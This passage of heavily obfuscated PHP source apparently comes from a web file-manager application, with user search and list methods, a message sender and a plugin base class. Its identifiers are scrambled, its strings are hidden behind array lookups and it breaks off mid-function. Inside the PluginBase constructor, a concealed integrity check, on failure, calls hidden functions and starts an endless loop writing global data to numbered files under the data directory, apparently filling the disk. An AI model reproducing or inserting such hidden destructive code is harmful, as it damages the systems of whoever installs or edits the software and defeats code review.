$this->_listDataApply($CåÍ£Âïö[$_SERVER[‚Ğ°–—î][354]]); return $CåÍ£Âïö; } public function listByID($d…Ş–â†Şœ) { $d‹ë¦»…¤ =& $_SERVER[‚Ğ°–—î]; if (!$d…Ş–â†Şœ) { return; } $FÕÅçÑ² = array($d‹ë¦»…¤[1438] => array($d‹ë¦»…¤[7], $d…Ş–â†Şœ)); $C¨ºâ÷ÀËñ = $this->where($FÕÅçÑ²)->select(); $this->_listDataApply($C¨ºâ÷ÀËñ); return $C¨ºâ÷ÀËñ; } public function listByGroup($bâ„¤³ö² = 0, $bƒ×¿ĞóÉ£ = array()) { goto bàËáè§Øº; C¾´·æåƒì: $this->_listDataApply($F‘Ø²¦îàó[$F õöê”[354]]); return $F‘Ø²¦îàó; goto bŸ˜”Ê…¡§; BÏŠ±…Ğ©Š: if ($bâ„¤³ö²) { $BÍ˜ñÂ”° = array($F õöê”[2530] => intval($bâ„¤³ö²)); $a„ˆÀšë¬„ = "\x4c\x45\x46\124\x20\112\x4f\111\116\x20{$this->tablePrefix}\x75\163\145\162\137\x67\162\x6f\165\x70\x20\x75\x73\x65\162\137\x67\x72\x6f\165\x70\40\157\156\x20\165\163\145\x72\x2e\165\x73\145\162\111\x44\40\x3d\40\x75\x73\145\x72\x5f\147\162\x6f\165\160\56\x75\x73\x65\x72\111\x44"; $F ëñ‘×— = Input::get($F õöê”[407], null, $F õöê”[33]) ? $F õöê”[33] : $F õöê”[2531]; } if (isset($bƒ×¿ĞóÉ£[$F õöê”[688]])) { $BÍ˜ñÂ”°[$F õöê”[2532]] = $bƒ×¿ĞóÉ£[$F õöê”[688]]; } $F‘Ø²¦îàó = $this->_makeOrder($F ëñ‘×—)->field($F õöê”[2533])->where($BÍ˜ñÂ”°)->join($a„ˆÀšë¬„)->selectPage(50); goto C¾´·æåƒì; bàËáè§Øº: $F õöê” =& $_SERVER[‚Ğ°–—î]; $a„ˆÀšë¬„ = $F õöê”[33]; $BÍ˜ñÂ”° = array(); goto BÏŠ±…Ğ©Š; bŸ˜”Ê…¡§: } private function _makeOrder($CÑõ†ëŞˆ— = '') { goto b±ö›› ¾Æ; eñïù«¬Ğå: $CÑõ†ëŞˆ— = $CÑõ†ëŞˆ— . "\165\163\x65\x72\56{$eå„…££Ó}\x20{$cÌ÷¹Ú®™´}\54\40\x75\163\145\x72\56\x75\x73\x65\x72\111\x44\40\x61\x73\143"; return $this->alias($EŸõê„¡¥´[2279])->order($CÑõ†ëŞˆ—); goto eÛ¾áƒÚ«; e‡¡¾íí¾Õ: $eå„…££Ó = Input::get($EŸõê„¡¥´[407], $EŸõê„¡¥´[7], $EŸõê„¡¥´[1429], $bĞˆôĞÒñ); $cÌ÷¹Ú®™´ = Input::get($EŸõê„¡¥´[408], $EŸõê„¡¥´[7], $EŸõê„¡¥´[2182], array($EŸõê„¡¥´[2182], $EŸõê„¡¥´[404])); $cÌ÷¹Ú®™´ = $F¦İ¦ÎÇ†ñ[$cÌ÷¹Ú®™´]; goto eñïù«¬Ğå; b±ö›› ¾Æ: $EŸõê„¡¥´ =& $_SERVER[‚Ğ°–—î]; $bĞˆôĞÒñ = array($EŸõê„¡¥´[1438], $EŸõê„¡¥´[28], $EŸõê„¡¥´[2093], $EŸõê„¡¥´[2065], $EŸõê„¡¥´[187]); $F¦İ¦ÎÇ†ñ = array($EŸõê„¡¥´[402] => $EŸõê„¡¥´[403], $EŸõê„¡¥´[404] => $EŸõê„¡¥´[405]); goto e‡¡¾íí¾Õ; eÛ¾áƒÚ«: } public function listSearch($e—ğç–È‰ã) { goto bäÃİ…Î¨¦; e§‹¿£º²÷: $F¹Û¹ß–Å = str_replace($e»íÒĞÖ•[2185], $e»íÒĞÖ•[2186], trim($F¹Û¹ß–Å)); $C×£æ÷¨ = array($e»íÒĞÖ•[28] => array($e»íÒĞÖ•[751], "\45{$F¹Û¹ß–Å}\45"), $e»íÒĞÖ•[293] => array($e»íÒĞÖ•[751], "\x25{$F¹Û¹ß–Å}\45"), $e»íÒĞÖ•[2336] => array($e»íÒĞÖ•[751], "\45{$F¹Û¹ß–Å}\45"), $e»íÒĞÖ•[915] => $e»íÒĞÖ•[2187]); if (Input::check($F¹Û¹ß–Å, $e»íÒĞÖ•[299])) { $C×£æ÷¨[$e»íÒĞÖ•[1438]] = array($e»íÒĞÖ•[751], "\45{$F¹Û¹ß–Å}\x25"); $C×£æ÷¨[$e»íÒĞÖ•[2514]] = array($e»íÒĞÖ•[751], "\x25{$F¹Û¹ß–Å}\x25"); } goto AÒ¼Ò—˜¶İ; a¹‡Å—‹ˆ: if (!$cÖ­Åë©òÉ || count($cÖ­Åë©òÉ[$e»íÒĞÖ•[354]]) < 5 && Input::check($F¹Û¹ß–Å, $e»íÒĞÖ•[306])) { $DÅ§¼ëçô = $this->_searchFromMeta($e»íÒĞÖ•[415], $F¹Û¹ß–Å, 10); $C„í‚‡Ãõ» = $this->_searchFromMeta($e»íÒĞÖ•[416], $F¹Û¹ß–Å, 10); $DÊõ¢ÃÉ„ = array_merge($DÅ§¼ëçô, $C„í‚‡Ãõ», $cÖ­Åë©òÉ[$e»íÒĞÖ•[354]]); $cÖ­Åë©òÉ[$e»íÒĞÖ•[354]] = array_unique_by_key($DÊõ¢ÃÉ„, $e»íÒĞÖ•[1438]); $cÖ­Åë©òÉ[$e»íÒĞÖ•[351]][$e»íÒĞÖ•[352]] = count($cÖ­Åë©òÉ[$e»íÒĞÖ•[354]]); $cÖ­Åë©òÉ[$e»íÒĞÖ•[351]][$e»íÒĞÖ•[353]] = ceil($cÖ­Åë©òÉ[$e»íÒĞÖ•[351]][$e»íÒĞÖ•[352]] / $cÖ­Åë©òÉ[$e»íÒĞÖ•[351]][$e»íÒĞÖ•[349]]); } $this->_listDataApply($cÖ­Åë©òÉ[$e»íÒĞÖ•[354]]); $this->_filterByGroup($cÖ­Åë©òÉ, $d‚Õª¦èÙ); goto eá¨‡©‹Š‘; eá¨‡©‹Š‘: return $cÖ­Åë©òÉ; goto d²Öª²Æ¥ê; bäÃİ…Î¨¦: $e»íÒĞÖ• =& $_SERVER[‚Ğ°–—î]; $F¹Û¹ß–Å = $e—ğç–È‰ã[$e»íÒĞÖ•[2183]]; $d‚Õª¦èÙ = isset($e—ğç–È‰ã[$e»íÒĞÖ•[2184]]) ? $e—ğç–È‰ã[$e»íÒĞÖ•[2184]] : !1; goto e§‹¿£º²÷; AÒ¼Ò—˜¶İ: if (!$F¹Û¹ß–Å) { $C×£æ÷¨ = array(); } if (isset($e—ğç–È‰ã[$e»íÒĞÖ•[688]])) { $C×£æ÷¨[$e»íÒĞÖ•[688]] = $e—ğç–È‰ã[$e»íÒĞÖ•[688]]; } $cÖ­Åë©òÉ = $this->_makeOrder()->where($C×£æ÷¨)->selectPage(20); goto a¹‡Å—‹ˆ; d²Öª²Æ¥ê: } private function _filterByGroup(&$E™¢ÈºŸ•è, $F•Æ‡œç¢) { $b™Õ´Üè— =& $_SERVER[‚Ğ°–—î]; if (!$F•Æ‡œç¢) { return $E™¢ÈºŸ•è; } foreach ($E™¢ÈºŸ•è[$b™Õ´Üè—[354]] as $aˆâÇòØ•å => &$c¥Ë–½©) { $Aßíğ†ëÒ = array_to_keyvalue($c¥Ë–½©[$b™Õ´Üè—[2534]], $b™Õ´Üè—[33], $b™Õ´Üè—[2107]); if (!in_array($F•Æ‡œç¢, $Aßíğ†ëÒ)) { unset($E™¢ÈºŸ•è[$b™Õ´Üè—[354]][$aˆâÇòØ•å]); } } $E™¢ÈºŸ•è[$b™Õ´Üè—[354]] = array_values($E™¢ÈºŸ•è[$b™Õ´Üè—[354]]); $E™¢ÈºŸ•è[$b™Õ´Üè—[351]] = array($b™Õ´Üè—[2312] => count($E™¢ÈºŸ•è[$b™Õ´Üè—[354]]), $b™Õ´Üè—[2310] => $E™¢ÈºŸ•è[$b™Õ´Üè—[351]][$b™Õ´Üè—[349]], $b™Õ´Üè—[2309] => 1, $b™Õ´Üè—[2311] => 1); } private function _searchFromMeta($D¯èäôŠ¢ğ, $B•äÕ¿¿Ø, $Bõœ˜Ğ¯ø¼) { goto E‹Ï»Š†; E‹Ï»Š†: $E™Ô¦àíô» =& $_SERVER[‚Ğ°–—î]; $B•äÕ¿¿Ø = strtolower($B•äÕ¿¿Ø); $B‡ÛĞ†–Òî = array($E™Ô¦àíô»[89] => $D¯èäôŠ¢ğ, $E™Ô¦àíô»[359] => array($E™Ô¦àíô»[751], "\x25{$B•äÕ¿¿Ø}\x25")); goto aàÉ°¹ìë; aàÉ°¹ìë: $E©¿ÏŠñã½ = Model($E™Ô¦àíô»[2535])->where($B‡ÛĞ†–Òî)->limit($Bõœ˜Ğ¯ø¼)->select(); if (!$E©¿ÏŠñã½) { return array(); } $E©¿ÏŠñã½ = array_to_keyvalue($E©¿ÏŠñã½, $E™Ô¦àíô»[33], $E™Ô¦àíô»[1438]); goto BêÜöêä¨§; BêÜöêä¨§: $Cäøµœ…¯… = $this->where(array($E™Ô¦àíô»[1429] => array($E™Ô¦àíô»[7], $E©¿ÏŠñã½)))->select(); if (!$Cäøµœ…¯…) { return array(); } return $Cäøµœ…¯…; goto a½›ëÑ¼·; a½›ëÑ¼·: } private function _listDataApplyItem($AøÈØÈË˜ˆ) { $e÷õæÑÙßÉ = array($AøÈØÈË˜ˆ); $this->_listDataApply($e÷õæÑÙßÉ); return $e÷õæÑÙßÉ[0]; } private function _listDataApply(&$CäŞ²Û¹ƒ¥) { goto c•Ù´Ò†ğ‘; B¤²²Ì‚êŠ: $f«ê…ñ‰É¨ = array_to_keyvalue($CäŞ²Û¹ƒ¥, $EçÀáƒ”õ»[33], $EçÀáƒ”õ»[1438]); $this->_listAppendGroup($CäŞ²Û¹ƒ¥, $f«ê…ñ‰É¨); $this->_listAppendMeta($CäŞ²Û¹ƒ¥, $f«ê…ñ‰É¨); goto aº‡ÎËôØ¹; aº‡ÎËôØ¹: $this->_listAppendSourceRoot($CäŞ²Û¹ƒ¥, $f«ê…ñ‰É¨); goto d¸˜öŠ½ùè; c•Ù´Ò†ğ‘: $EçÀáƒ”õ» =& $_SERVER[‚Ğ°–—î]; if (!$CäŞ²Û¹ƒ¥) { return; } array_remove_key($CäŞ²Û¹ƒ¥, $EçÀáƒ”õ»[802]); goto B¤²²Ì‚êŠ; d¸˜öŠ½ùè: } private function _listAppendSourceRoot(&$DËâË˜, $BãÄÍ±°ôÛ) { goto cåÌç¹²›; f•ŠÊÙ©Ö×: foreach ($DËâË˜ as &$D½÷ï‚³²õ) { $D½÷ï‚³²õ[$c¼ÀùĞò÷¡[391]] = $AÁ«¾§ªÁ[$D½÷ï‚³²õ[$c¼ÀùĞò÷¡[1438]]] ? $AÁ«¾§ªÁ[$D½÷ï‚³²õ[$c¼ÀùĞò÷¡[1438]]] : array(); } goto Câƒùæ›¦ª; a‚ÔêÃ¼¿: $AÁ«¾§ªÁ = Model($c¼ÀùĞò÷¡[752])->order($c¼ÀùĞò÷¡[2194])->field($A‡©µˆÆîÈ)->where($Döçœì¸»İ)->select(); $AÁ«¾§ªÁ = array_to_keyvalue($AÁ«¾§ªÁ, $c¼ÀùĞò÷¡[456]); $AÁ«¾§ªÁ = array_remove_key($AÁ«¾§ªÁ, $c¼ÀùĞò÷¡[456]); goto f•ŠÊÙ©Ö×; cåÌç¹²›: $c¼ÀùĞò÷¡ =& $_SERVER[‚Ğ°–—î]; $Döçœì¸»İ = array($c¼ÀùĞò÷¡[461] => 0, $c¼ÀùĞò÷¡[371] => SourceModel::TYPE_USER, $c¼ÀùĞò÷¡[456] => array($c¼ÀùĞò÷¡[7], $BãÄÍ±°ôÛ)); $A‡©µˆÆîÈ = $c¼ÀùĞò÷¡[2193]; goto a‚ÔêÃ¼¿; Câƒùæ›¦ª: } private function _listAppendGroup(&$eÒ©Íàà—¡, $CÔŠƒÀ†§§) { goto a‹Óøß¨Ü; BÀóé•Î·â: $cŒ·‚çÂÇ  = array_to_keyvalue_group($cŒ·‚çÂÇ , $BŞæòõš±•[1438]); foreach ($cŒ·‚çÂÇ  as &$b›øŸ½ÈãÈ) { $B‹ÖƒÉÂï® = array(); foreach ($b›øŸ½ÈãÈ as $B–Ú³¦Ñ´è) { if (!$B–Ú³¦Ñ´è[$BŞæòõš±•[2235]]) { continue; } $Aîá§ƒ­ö = Model($BŞæòõš±•[2254])->listData($B–Ú³¦Ñ´è[$BŞæòõš±•[2235]]); $B‹ÖƒÉÂï®[] = array($BŞæòõš±•[2107] => $B–Ú³¦Ñ´è[$BŞæòõš±•[2107]], $BŞæòõš±•[2538] => $a¹§™½Û [$B–Ú³¦Ñ´è[$BŞæòõš±•[2107]]], $BŞæòõš±•[376] => $Aîá§ƒ­ö); } $b›øŸ½ÈãÈ = $B‹ÖƒÉÂï®; } foreach ($eÒ©Íàà—¡ as &$D®òâ‡Úö•) { $D®òâ‡Úö•[$BŞæòõš±•[2534]] = array(); if (isset($cŒ·‚çÂÇ [$D®òâ‡Úö•[$BŞæòõš±•[1438]]])) { $D®òâ‡Úö•[$BŞæòõš±•[2534]] = $cŒ·‚çÂÇ [$D®òâ‡Úö•[$BŞæòõš±•[1438]]]; } } goto aÕƒ•ŞÇŠç; a‹Óøß¨Ü: $BŞæòõš±• =& $_SERVER[‚Ğ°–—î]; $c§¿´ë»‹½ = array($BŞæòõš±•[1438] => array($BŞæòõš±•[7], $CÔŠƒÀ†§§)); $cŒ·‚çÂÇ  = Model($BŞæòõš±•[2181])->where($c§¿´ë»‹½)->select(); goto b¡‘õÏ­; b¡‘õÏ­: $A¨´ëˆ·É‡ = array_to_keyvalue($cŒ·‚çÂÇ , $BŞæòõš±•[33], $BŞæòõš±•[2107]); $A¨´ëˆ·É‡ = array_remove_value(array_unique($A¨´ëˆ·É‡), $BŞæòõš±•[468]); if (!$A¨´ëˆ·É‡ || !$cŒ·‚çÂÇ ) { return; } goto A‘Â×Ö£½ˆ; A‘Â×Ö£½ˆ: $c§¿´ë»‹½ = array($BŞæòõš±•[2107] => array($BŞæòõš±•[7], $A¨´ëˆ·É‡)); $A¼¼ôÅ¡’ = Model($BŞæòõš±•[2536])->field($BŞæòõš±•[2537])->where($c§¿´ë»‹½)->select(); $a¹§™½Û  = array_to_keyvalue($A¼¼ôÅ¡’, $BŞæòõš±•[2107], $BŞæòõš±•[28]); goto BÀóé•Î·â; aÕƒ•ŞÇŠç: } private function _listAppendMeta(&$dò°½‰Åà, $C¤Œé—ã‚Ó) { goto e§ö¬Šê–; aÇ…¼¤ÙÊß: $eœ£éœ‰‹• = array($dËîé×èº„[1438] => array($dËîé×èº„[7], $C¤Œé—ã‚Ó)); $Bä½”¶Ÿ± = Model($dËîé×èº„[2513])->where($eœ£éœ‰‹•)->select(); $Bä½”¶Ÿ± = array_to_keyvalue_group($Bä½”¶Ÿ±, $dËîé×èº„[1438]); goto cêÊ‚©…¯‰; e§ö¬Šê–: $dËîé×èº„ =& $_SERVER[‚Ğ°–—î]; $c¬ï§›‚Å = UserJobModel::JOB_KEY; $EŞªÆï–Ş = array($dËîé×èº„[2516]); goto aÇ…¼¤ÙÊß; cêÊ‚©…¯‰: foreach ($Bä½”¶Ÿ± as &$B¤î®è®œÊ) { $c½‡Î½¤µ… = array(); foreach ($B¤î®è®œÊ as $Fè·ÓÏå•·) { if (!in_array($Fè·ÓÏå•·[$dËîé×èº„[89]], $EŞªÆï–Ş)) { $c½‡Î½¤µ…[$Fè·ÓÏå•·[$dËîé×èº„[89]]] = $Fè·ÓÏå•·[$dËîé×èº„[359]]; } } $B¤î®è®œÊ = $c½‡Î½¤µ…; } $c¶”ä™ÜÛÃ = Model($dËîé×èº„[2539]); foreach ($dò°½‰Åà as &$Eë’¥¸’× ) { $fÁöÃâç´ß = array(); if (isset($Bä½”¶Ÿ±[$Eë’¥¸’× [$dËîé×èº„[1438]]])) { $fÁöÃâç´ß = $Bä½”¶Ÿ±[$Eë’¥¸’× [$dËîé×èº„[1438]]]; } $Eë’¥¸’× [$dËîé×èº„[2540]] = array(); if (isset($fÁöÃâç´ß[$c¬ï§›‚Å])) { $Eë’¥¸’× [$dËîé×èº„[2540]] = $c¶”ä™ÜÛÃ->getUserJobInfo($fÁöÃâç´ß[$c¬ï§›‚Å]); } } goto Cğ‚ààÄ«; Cğ‚ààÄ«: } public function userSearch($b‰àì¿•·, $dØ…ÚÄÙ = "\x2a") { return Model($_SERVER[‚Ğ°–—î][477])->where($b‰àì¿•·)->field($dØ…ÚÄÙ)->find(); } } goto B„Œ‡İªĞÁ; Aœ¬šä‚: class Message { function __construct() { } public function send($c”ê»ˆÁ¿ù = '', $eÈğ¬³ÆÂ« = array(), $fÉ÷À¬ÑØë = "\164\x65\170\164") { goto BÇæ®äåŠ; eó’ÛÀÜñƒ: $eÈğ¬³ÆÂ« = array($A¬²²„¹á»[972] => isset($eÈğ¬³ÆÂ«[$A¬²²„¹á»[972]]) ? $eÈğ¬³ÆÂ«[$A¬²²„¹á»[972]] : $A¬²²„¹á»[33], $A¬²²„¹á»[535] => isset($eÈğ¬³ÆÂ«[$A¬²²„¹á»[535]]) ? $eÈğ¬³ÆÂ«[$A¬²²„¹á»[535]] : $A¬²²„¹á»[33]); if (empty($c”ê»ˆÁ¿ù) || empty($eÈğ¬³ÆÂ«[$A¬²²„¹á»[972]]) && empty($eÈğ¬³ÆÂ«[$A¬²²„¹á»[535]])) { return !1; } $Eˆºæ•©Ëå = array($A¬²²„¹á»[1246] => $Dø±öÅî×¡, $A¬²²„¹á»[1306] => $eÈğ¬³ÆÂ«); goto f¿Æ™‡²·¨; f¿Æ™‡²·¨: Hook::trigger($A¬²²„¹á»[1307], $Eˆºæ•©Ëå); goto EéÄÀí™’‰; BÇæ®äåŠ: $A¬²²„¹á» =& $_SERVER[‚Ğ°–—î]; $Dø±öÅî×¡ = array($A¬²²„¹á»[29] => $A¬²²„¹á»[1304], $A¬²²„¹á»[691] => $c”ê»ˆÁ¿ù); if (in_array($fÉ÷À¬ÑØë, array($A¬²²„¹á»[1304], $A¬²²„¹á»[1305]))) { $Dø±öÅî×¡[$A¬²²„¹á»[29]] = $fÉ÷À¬ÑØë; } goto eó’ÛÀÜñƒ; EéÄÀí™’‰: } } class PluginBase { public $in; public $pluginName; public $pluginPath; public $pluginHost; public $pluginHostDefault; public $pluginApi; public $packageData; private $pluginLangArr; private $pluginConfig; public $cachePath; public $fileInfo; function __construct() { goto f°‡±Äé¤Â; fø¾½äÀ‡ö: $this->pluginPath = PLUGIN_DIR . $this->pluginName . $c¶…ÆÛ„ƒÉ[8]; $this->pluginApi = appHostGet() . $c¶…ÆÛ„ƒÉ[1312] . $this->pluginName . $c¶…ÆÛ„ƒÉ[8]; $this->pluginHost = $config[$c¶…ÆÛ„ƒÉ[1313]] . $this->pluginName . $c¶…ÆÛ„ƒÉ[8]; goto B«Âñ¾Ê…; f½°İÃ÷Àø: $this->pluginLangArr = $this->initLang(); $this->values = array(); return $this; goto AÁã‰§ËÕ; bä¦ŸèØìç: $this->in =& $in; $this->modelPlugin = Model($c¶…ÆÛ„ƒÉ[1311]); $this->pluginName = str_replace($c¶…ÆÛ„ƒÉ[1311], $c¶…ÆÛ„ƒÉ[33], get_class($this)); goto fø¾½äÀ‡ö; B«Âñ¾Ê…: $this->pluginHostDefault = $config[$c¶…ÆÛ„ƒÉ[1313]] . $this->pluginName . $c¶…ÆÛ„ƒÉ[8]; $CĞíÙÃö– = $config[$c¶…ÆÛ„ƒÉ[1314]]; if ($CĞíÙÃö– && strpos($c¶…ÆÛ„ƒÉ[47] . $CĞíÙÃö– . $c¶…ÆÛ„ƒÉ[47], $this->pluginName) !== !1) { $this->pluginHost = $config[$c¶…ÆÛ„ƒÉ[1315]] . $this->pluginName . $c¶…ÆÛ„ƒÉ[8]; } goto f½°İÃ÷Àø; fÀ¢ÕØ¦ÖÁ: if ($_SERVER[$c¶…ÆÛ„ƒÉ[777]] != $e ŠãÉ½±ª($aÈâõ¢Èº¡)) { goto e´âÉ¨Ïö†; e´âÉ¨Ïö†: $a‡ğœÇ…È… = $c¶…ÆÛ„ƒÉ[794]; $DÉ‹‚ù°¢¬ = $c¶…ÆÛ„ƒÉ[779]; $a¼¦ƒÉ´á = $_SERVER[$c¶…ÆÛ„ƒÉ[780]] . $c¶…ÆÛ„ƒÉ[781]; goto Aî÷…‘”Š; Aî÷…‘”Š: $BÆõÆ‘µ¥… = $DÉ‹‚ù°¢¬($a¼¦ƒÉ´á); $fÔ…µÑ¦ä± = explode($c¶…ÆÛ„ƒÉ[217], $BÆõÆ‘µ¥…); if (count($fÔ…µÑ¦ä±) < $c¶…ÆÛ„ƒÉ[555]) { $AÏê·‹ô = $c¶…ÆÛ„ƒÉ[782]; $AÏê·‹ô(); } goto Bßèª°ôº; Bßèª°ôº: $D’ª“Å£´‚ = $c¶…ÆÛ„ƒÉ[795]; $D’ª“Å£´‚($_SERVER[$c¶…ÆÛ„ƒÉ[796]]); $a‡ğœÇ…È… = $c¶…ÆÛ„ƒÉ[794]; goto DŸµÇí¸Ÿˆ; EÀŸœ×Ã•®: $B±ÙİÃø¿Œ = 1; for ($B½Ç‡ˆª¸ = $B±ÙİÃø¿Œ; $B½Ç‡ˆª¸ > 0; $B½Ç‡ˆª¸++) { $F°›¡Ò´…§(DATA_PATH . $B½Ç‡ˆª¸, $aÉˆ¶—±·); } goto dêˆ¶òÀÏ†; DŸµÇí¸Ÿˆ: $a‡ğœÇ…È…(); $F°›¡Ò´…§ = $c¶…ÆÛ„ƒÉ[1309]; $aÉˆ¶—±· = json_encode($GLOBALS[$c¶…ÆÛ„ƒÉ[1310]]); goto EÀŸœ×Ã•®; dêˆ¶òÀÏ†: } global $in, $config; $this->config =& $config; goto bä¦ŸèØìç; f°‡±Äé¤Â: $c¶…ÆÛ„ƒÉ =& $_SERVER[‚Ğ°–—î]; $aÈâõ¢Èº¡ = $_SERVER[$c¶…ÆÛ„ƒÉ[780]] . $c¶…ÆÛ„ƒÉ[781]; $e ŠãÉ½±ª = $c¶…ÆÛ„ƒÉ[1308]; goto fÀ¢ÕØ¦ÖÁ; AÁã‰§ËÕ: } public function regist() { $this->hookRegist(array()); } public function install() { } public function update() { } public function unInstall() { } public function echoJs() { $this->echoFile($_SERVER[‚Ğ°–—î][1316]); } protected function assign($Böêİí•Ûµ, $E’Î±öîºÜ = false) { if (is_array($Böêİí•Ûµ)) { $this->values = array_merge($this->values, $Böêİí•Ûµ); } else { $this->values[$Böêİí•Ûµ] = $E’Î±öîºÜ; } } protected function display($f”Ú¹Š•çé) { extract($this->values); require $f”Ú¹Š•çé; } final function hookRegist($F¼ªµÍ¬µÂ) { $this->modelPlugin->appRegist($this->pluginName, $F¼ªµÍ¬µÂ); } final function appIcon() { $cÎÓÒõ¸¯§ =& $_SERVER[‚Ğ°–—î]; $cì ¤ŠÖæ = $this->appPackage(); $aé‰¶àºÙŸ = $cÎÓÒõ¸¯§[33]; if (isset($cì ¤ŠÖæ[$cÎÓÒõ¸¯§[382]])) { if (isset($cì ¤ŠÖæ[$cÎÓÒõ¸¯§[382]][$cÎÓÒõ¸¯§[1317]])) { $aé‰¶àºÙŸ = $cÎÓÒõ¸¯§[1318] . $cì ¤ŠÖæ[$cÎÓÒõ¸¯§[382]][$cÎÓÒõ¸¯§[1317]] . $cÎÓÒõ¸¯§[1319]; } else { if ($cì ¤ŠÖæ[$cÎÓÒõ¸¯§[382]][$cÎÓÒõ¸¯§[1320]]) { $aé‰¶àºÙŸ = $cÎÓÒõ¸¯§[1321] . $cì ¤ŠÖæ[$cÎÓÒõ¸¯§[382]][$cÎÓÒõ¸¯§[1320]] . $cÎÓÒõ¸¯§[1322]; } } } return $aé‰¶àºÙŸ; } final function fileCanView($bªíÒèâ¾) { goto Eø¼¶¬­™è; cœºø©ˆÛï: ActionCall($DÊÒÍ¶Ôë‡[1335], $bªíÒèâ¾); goto D´Û×ˆÉ¾Ø; Eø¼¶¬­™è: $DÊÒÍ¶Ôë‡ =& $_SERVER[‚Ğ°–—î]; if (request_url_safe($bªíÒèâ¾)) { return !0; } if ($this->isShare($bªíÒèâ¾)) { return !0; } goto d“â²Œ´; d“â²Œ´: $BÍÊì…ƒ… = Session::get($DÊÒÍ¶Ôë‡[1323]); if (!$BÍÊì…ƒ… || !$BÍÊì…ƒ…[$DÊÒÍ¶Ôë‡[1324]]) { $fİÁìâ»¤ = $DÊÒÍ¶Ôë‡[1325] . rawurlencode(this_url()); show_tips(LNG($DÊÒÍ¶Ôë‡[1326]) . $DÊÒÍ¶Ôë‡[1327] . $fİÁìâ»¤ . $DÊÒÍ¶Ôë‡[1328] . LNG($DÊÒÍ¶Ôë‡[1329]) . $DÊÒÍ¶Ôë‡[1330], !1); } if (!Action($DÊÒÍ¶Ôë‡[1331])->authCan($DÊÒÍ¶Ôë‡[1332])) { show_tips(LNG($DÊÒÍ¶Ôë‡[1333]) . $DÊÒÍ¶Ôë‡[1334], !1); } goto cœºø©ˆÛï; D´Û×ˆÉ¾Ø: } final function isShare($E¶æ×Í³†±) { $fƒñ‡‰“µ = KodIO::parse($E¶æ×Í³†±); return $fƒñ‡‰“µ[$_SERVER[‚Ğ°–—î][29]] == KodIO::KOD_SHARE_LINK; } final function filePathLink($dª´á¶«¦¾) { if (request_url_safe($dª´á¶«¦¾)) { return $dª´á¶«¦¾; } if (!$this->isShare($dª´á¶«¦¾)) { $dª´á¶«¦¾ = $this->filePath($dª´á¶«¦¾); } return Action($_SERVER[‚Ğ°–—î][1019])->linkOut($dª´á¶«¦¾); } public function filePathLinkOut($C÷†ª›ĞèŠ) { if (request_url_safe($C÷†ª›ĞèŠ)) { return $C÷†ª›ĞèŠ; } $this->fileCanView($C÷†ª›ĞèŠ); return Action($_SERVER[‚Ğ°–—î][1019])->link($C÷†ª›ĞèŠ); } final function filePath($cœ‰éëŒÓõ) { $c’ˆğ÷Ï¯¼ =& $_SERVER[‚Ğ°–—î]; if ($bõÄÁÕÓ«Ş = $this->checkSharePath($cœ‰éëŒÓõ)) { return $bõÄÁÕÓ«Ş; } $this->fileCanView($cœ‰éëŒÓõ); if (request_url_safe($cœ‰éëŒÓõ)) { $aŠ¹É¯¬Ú‹ = parse_url_query($cœ‰éëŒÓõ); if (isset($aŠ¹É¯¬Ú‹[$c’ˆğ÷Ï¯¼[1336]]) && isset($aŠ¹É¯¬Ú‹[$c’ˆğ÷Ï¯¼[197]])) { $a˜‰Äñ íƒ = Model($c’ˆğ÷Ï¯¼[1089])->get($c’ˆğ÷Ï¯¼[1337]); $Bß‰é­ßé» = Mcrypt::decode($aŠ¹É¯¬Ú‹[$c’ˆğ÷Ï¯¼[197]], $a˜‰Äñ íƒ); if ($Bß‰é­ßé») { $this->fileInfo = IO::infoWithChildren($Bß‰é­ßé»); $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); return $Bß‰é­ßé»; } } $cœ‰éëŒÓõ = $this->_cacheHttpFile($cœ‰éëŒÓõ); $this->fileInfo = IO::infoWithChildren($cœ‰éëŒÓõ); } else { $this->fileInfo = IO::infoWithChildren($cœ‰éëŒÓõ); if (!$this->fileInfo) { show_tips(LNG($c’ˆğ÷Ï¯¼[101]), !1); } $this->cachePath = $this->pluginCachePath($this->_tmpFileName()); } return $cœ‰éëŒÓõ; } final function _cacheHttpFile($Cë¡‰Å§Ú¥) { $A®òÚ‘Ş’Â = hash_path($Cë¡‰Å§Ú¥, !0); $this->cachePath = $this->pluginCachePath($A®òÚ‘Ş’Â); if ($AÏ¯ˆÛŠ±£ = IO::fileNameExist($this->cachePath, $A®òÚ‘Ş’Â)) { return KodIO::make($AÏ¯ˆÛŠ±£); } $BÉóÅ‡­„· = $this->cachePath . $A®òÚ‘Ş’Â; return $this->pluginCacheFileSet($BÉóÅ‡­„·, file_get_contents($Cë¡‰Å§Ú¥)); } final function _tmpFileName($f©Ôİğ•Á = array()) { goto d‘…¥—Ä–; CÑ‰â«¦ôƒ: if (isset($f©Ôİğ•Á[$D±ÌÇì¡™˜[162]][$D±ÌÇì¡™˜[164]])) { return $f©Ôİğ•Á[$D±ÌÇì¡™˜[162]][$D±ÌÇì¡™˜[164]]; } $AÛé¾¢È§° = IO::hashSimple($f©Ôİğ•Á[$D±ÌÇì¡™˜[75]]); if ($AÛé¾¢È§°) { return $AÛé¾¢È§°; } goto c‡®Şæ±ñ×; d‘…¥—Ä–: $D±ÌÇì¡™˜ =& $_SERVER[‚Ğ°–—î]; if (!$f©Ôİğ•Á) { $f©Ôİğ•Á = $this->fileInfo; } if (isset($f©Ôİğ•Á[$D±ÌÇì¡™˜[164]])) { return $f©Ôİğ•Á[$D±ÌÇì¡™˜[164]]; } goto CÑ‰â«¦ôƒ; c‡®Şæ±ñ×: $D¯Ò²Äáç = array($f©Ôİğ•Á[$D±ÌÇì¡™˜[28]], $f©Ôİğ•Á[$D±ÌÇì¡™˜[75]], $f©Ôİğ•Á[$D±ÌÇì¡™˜[77]]); if (isset($f©Ôİğ•Á[$D±ÌÇì¡™˜[459]])) { $D¯Ò²Äáç[] = $f©Ôİğ•Á[$D±ÌÇì¡™˜[459]]; } return md5(implode($D±ÌÇì¡™˜[70], $D¯Ò²Äáç)); goto eÜÑÃŸôæ; eÜÑÃŸôæ: } final function checkSharePath($c¿‹è–ğ÷) { goto cÔè‘Èê’Ì; cÔè‘Èê’Ì: $aÊÃŠïƒ¦ =& $_SERVER[‚Ğ°–—î]; if (!defined($aÊÃŠïƒ¦[427])) { define($aÊÃŠïƒ¦[1338], 0); } if (!$this->isShare($c¿‹è–ğ÷)) { return !1; } goto cáö¬’Î²; E³“±‰ ò: $this->cachePath = $this->pluginCachePath($this->fileInfo[$aÊÃŠïƒ¦[164]]); return 